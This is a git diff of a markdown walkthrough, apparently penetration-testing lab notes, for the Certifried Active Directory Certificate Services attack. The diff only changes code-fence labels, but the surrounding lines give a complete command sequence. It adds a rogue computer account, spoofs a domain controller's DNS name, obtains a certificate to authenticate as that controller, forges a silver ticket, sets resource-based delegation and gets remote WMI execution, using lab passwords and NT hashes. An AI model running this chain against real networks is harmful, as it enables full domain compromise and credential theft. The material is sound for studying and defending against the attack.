@@ -22,13 +22,13 @@ certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -dc-ip 10.
 
 Add computer which dnsHostName should match DCs.
 
-```sh
+```bash
 addcomputer.py -computer-name 'CERTIFRIED$' -computer-pass 'Password123!' -dc-ip 10.129.228.134 'LAB.LOCAL/Blwasp':'Password123!'
 ```
 
 Enumerate and check DNS names
 
-```sh
+```bash
 certipy find -u 'BlWasp@lab.local' -p 'Password123!' -stdout -vulnerable
 ```
 
@@ -47,37 +47,37 @@ Set-DomainObject -Identity 'CERTIFRIED$' -Set dnsHostName="dc02.lab.local"
 
 Request certificate and impersonate DC
 
-```shell-session
+```bash
 certipy req -u 'CERTIFRIED$' -p 'Password123!' -dc-ip 10.129.228.134 -ca lab-LAB-DC-CA -template 'Machine'
 ```
 
 Authenticate
 
-```sh
+```bash
 certipy auth -pfx dc02.pfx
 ```
 
 Proceed for silver ticket, get SID
 
-```sh
+```bash
 nxc ldap 10.129.228.237 -u dc02$ -H cdd3cf40d6d5bee74013db1c26f58ee1 --get-sid
 ```
 
 Get silver ticket
 
-```sh
+```bash
 ticketer.py -nthash db35f9cf2e343f0795d33aef721a8f9a -domain-sid S-1-5-21-2810262047-4248699891-1002428937 -domain lab.local -spn cifs/dc02.lab.local Administrator
 ```
 
 ### Alternate Method
 
-```shell
+```bash
 certipy auth -pfx dc02.pfx -dc-ip 10.129.228.237 -ldap-shell
 ```
 
 In ldap shell
 
-```sh
+```bash
 add_computer ESC1 E$C1
 set_rbcd DC02$ ESC1$
 exit
@@ -85,13 +85,13 @@ exit
 
 Request CIFS ticket
 
-```shell
+```bash
 getST.py -spn cifs/dc02.lab.local -impersonate Administrator -dc-ip 10.129.228.237 'lab.local/esc1$:E$C1'
 ```
 
 Then connect
 
-```sh
+```bash
 # WMI
 KRB5CCNAME=Administrator@cifs_dc02.lab.local@LAB.LOCAL.ccache wmiexec.py -k -no-pass dc02.lab.local  
 
